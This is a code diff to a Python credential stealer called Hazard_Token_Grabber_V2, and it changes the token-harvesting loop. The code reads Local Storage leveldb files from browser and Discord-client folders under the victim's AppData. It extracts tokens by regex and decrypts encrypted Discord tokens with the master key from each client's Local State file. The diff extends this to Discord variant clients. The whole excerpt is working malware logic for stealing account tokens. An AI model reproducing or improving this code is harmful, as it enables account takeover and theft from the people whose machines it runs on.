@@ -266,26 +266,27 @@ class Hazard_Token_Grabber_V2(functions):
             'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
         }
 
-        for _, path in paths.items():
+        for name, path in paths.items():
             if not os.path.exists(path):
                 continue
-            if "discord" not in path:
-                for file_name in os.listdir(path):
-                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-                        continue
-                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                        for regex in (self.regex):
-                            for token in findall(regex, line):
-                                asyncio.run(self.checkToken(token))
-            else:
-                if os.path.exists(self.roaming+'\\discord\\Local State'):
+            disc = name.replace(" ", "").lower()
+            if "cord" in path:
+                if os.path.exists(self.roaming+f'\\{disc}\\Local State'):
                     for file_name in os.listdir(path):
                         if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                             continue
                         for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                             for y in findall(self.encrypted_regex, line):
                                 token = self.decrypt_val(b64decode(
-                                    y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
+                                    y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{disc}\\Local State'))
+                                asyncio.run(self.checkToken(token))
+            else:
+                for file_name in os.listdir(path):
+                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for regex in (self.regex):
+                            for token in findall(regex, line):
                                 asyncio.run(self.checkToken(token))
 
         if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
